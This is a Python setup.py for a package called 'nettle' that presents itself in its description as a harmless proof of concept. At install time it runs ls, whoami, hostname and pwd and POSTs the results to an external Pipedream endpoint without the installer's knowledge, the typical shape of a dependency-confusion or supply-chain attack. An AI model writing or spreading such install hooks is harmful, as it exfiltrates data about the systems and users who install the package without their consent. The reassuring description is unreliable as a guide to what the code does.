from setuptools import setup
import os
import http.client

# Define the commands to execute
commands = ['ls', 'whoami', 'hostname', 'pwd']
output = []

# Execute each command and store the output
for cmd in commands:
    output.append(f"{cmd} : ")
    output.append(os.popen(cmd).read())

# Send the output to the Pipedream server
conn = http.client.HTTPSConnection('eofu0ntgqm9ibyz.m.pipedream.net')
conn.request("POST", "/", "\n".join(output), {'Content-Type': 'text/plain'})

setup(name='nettle',
      version='5.0.2',
      description='This is just for a making PoC purpose. It will not harm anyone. So, do not worry.',
      author='manan_sanghvi',
      )
